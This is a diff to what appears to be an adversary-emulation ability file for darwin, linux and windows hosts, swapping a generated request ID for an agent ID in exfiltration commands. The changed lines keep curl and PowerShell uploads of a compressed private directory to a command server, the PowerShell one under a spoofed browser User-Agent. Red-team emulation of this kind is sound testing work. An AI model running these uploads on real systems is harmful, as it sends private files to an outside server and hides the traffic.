@@ -11,15 +11,11 @@
     darwin:
       sh:
         command: |
-          REQUESTID=$(uuidgen);
-          echo $REQUESTID;
-          curl -F "data=@#{host.dir.compress.private}" --header “X-Request-ID: $REQUESTID” #{server}/file/upload
+          curl -F "data=@#{host.dir.compress.private}" --header “X-Request-ID: #{paw}” #{server}/file/upload
     linux:
       sh:
         command: |
-          REQUESTID=$(uuidgen);
-          echo $REQUESTID;
-          curl -F "data=@#{host.dir.compress.private}" --header “X-Request-ID: $REQUESTID” #{server}/file/upload
+          curl -F "data=@#{host.dir.compress.private}" --header “X-Request-ID: #{paw}” #{server}/file/upload
     windows:
       psh:
         command: |
@@ -35,6 +31,6 @@
           $web.open("POST", $url, $false);
           Write-Host $boundary;
           $web.setRequestHeader("Content-Type","multipart/form-data; boundary=$boundary");
-          $web.setRequestHeader(“X-Request-ID”,“$boundary");
+          $web.setRequestHeader(“X-Request-ID”,“#{paw}");
           $web.setRequestHeader("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
           $web.Send($bodyLines);
